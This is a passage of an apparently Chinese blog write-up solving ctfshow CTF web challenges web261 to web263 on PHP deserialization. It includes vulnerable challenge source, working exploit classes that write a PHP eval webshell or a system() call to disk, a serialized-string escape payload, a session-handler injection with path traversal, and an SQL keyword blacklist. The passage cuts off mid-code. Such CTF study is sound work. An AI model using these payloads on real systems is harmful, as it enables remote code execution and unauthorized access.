class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><strong>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，</strong><br><strong>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</strong><br>其中注意一下几个：</p><ul><li><code>__wakeup()</code> 反序列化之后立刻调用</li><li><code>__invoke()</code> 当作方法调用对象</li><li><code>__sleep()</code> 反序列化之前运行</li></ul><p>invoke似乎进不去，这里利用弱比较拼接。0x36d对应的十进制是877.<br>由于弱比较的原因username传入877.php 再在password中加入shell即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>());</span><br></pre></td></tr></table></figure><p>然后访问<code>877.php</code>然后传入shell：<br><code>/877.php?1=system(&#39;cat /flag_is_here&#39;);</code></p><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><h3 id="经典字符串逃逸-增长版"><a href="#经典字符串逃逸-增长版" class="headerlink" title="经典字符串逃逸-增长版"></a>经典字符串逃逸-增长版</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里提示了还有一个message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就是要将user转换为admin。那么先查看标准的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>直接在t末尾修改：<br>将t修改为以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>一个转换就能多容纳一个位置，那么26个字符需要添加27个fuck。<br>然后就使用payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span></span><br><span class="line">&amp;m=<span class="number">1</span></span><br><span class="line">&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>然后访问message.php即可获取到flag</p><h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request_id%22:%22160775411819724848183660%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=160775411819724848183660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2118.3001.4450">https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request%5Fid%22%3A%22160775411819724848183660%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=160775411819724848183660&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&amp;utm_term=session&amp;spm=1018.2118.3001.4450</a> session<br><a href="https://www.jb51.net/article/116246.htm">https://www.jb51.net/article/116246.htm</a> session</p></blockquote><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p><a href="http://www.zip文件泄露/">www.zip文件泄露</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::<span class="variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="variable constant_">CASE_NATURAL</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生成唯一标志</span></span><br><span class="line"><span class="comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>inc.php中有file_put_contents函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));<span class="comment">// </span></span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //密码必须为<span class="number">128</span>位大小写字母+数字+特殊符号，防止爆破</span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//登陆成功取消次数累计</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//登陆失败累计次数加1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.php就是登录页面、check.php进行次数检测。whatweb检测一下php版本是7.3.11<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690621414307-0b75bbfc-20e6-46df-9214-207db020284a.png" alt="image.png"><br>session.serialize_handler( 5.5.4前默认是php；5.5.4后改为php_serialize)存在以下几种：</p><ul><li>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li>php 键名+竖线（|）+经过serialize()函数处理过的值</li><li>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</li></ul><p>php处理器而不是php_serialize处理器，所以存在session反序列漏洞.<br>在 php_serialize 引擎下，session文件中存储的数据为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>php 引擎下文件内容为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin/../../../../../../../../../../var/www/html/1.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$c</span> =  <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ 